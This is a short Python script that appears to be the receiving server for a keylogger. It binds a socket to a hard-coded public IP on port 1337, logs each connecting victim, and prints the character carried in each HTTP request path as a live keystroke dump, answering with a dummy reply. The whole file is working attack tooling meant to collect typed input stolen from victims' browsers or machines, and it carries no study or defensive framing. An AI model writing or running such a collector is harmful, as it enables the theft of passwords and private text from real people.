import sys, socket

OKBLUE  = '\033[94m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL    = '\033[91m'
ENDC    = '\033[0m'

TCP_IP = '88.198.205.243'
TCP_PORT = 1337
BUFFER_SIZE = 512

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((TCP_IP, TCP_PORT))
s.listen(5)
clients = []

try:
    while 1:
        conn, addr = s.accept()
        if not str(addr[0]) in clients:
            clients.append(str(addr[0]))
            print(OKGREEN + "[+] Client %s connected" % (str(addr[0])) + ENDC)
        #print(OKBLUE    + "[*] Starting keydump..."                     + ENDC)
        tmp = ""
        while 1:
            try:
                data = conn.recv(BUFFER_SIZE) # This returns immediately with no data, when client connection is run from script and doesn't send() anything, just connects.
            except ConnectionResetError as e:
                print(FAIL + "\n[-] Client %s disconnected hard" % (str(addr[0])) + ENDC)
                break
            if not data:
                #print(WARNING + "\n[-] Client %s disconnected nicely" % (str(addr[0])) + ENDC)
                break

            data = str(data)
            # Filter for the first / and the HTTP to find the send character
            print(data[7:data.find("HTTP")-1], end='')
            sys.stdout.flush()

            response = ("HTTP/1.1 200 OK\r\n" +
                        "Server: WebServer\r\n" +
                        "Content-Type: text/html\r\n" +
                        "Content-Length: 3\r\n"
                        "Cache-Control: no-cache\r\n" +
                        "Connection: close\r\n" +
                        "\r\n" +
                        "123")
            conn.send(response.encode())

        sys.stdout.flush()
        conn.close()
except KeyboardInterrupt as e:
    s.close()
    print(OKBLUE + "\n[-] Shutting down.." + ENDC)
except Exception as e:
    s.close()
    print(FAIL + "[X] Unhandelt Error:")
    print(e)
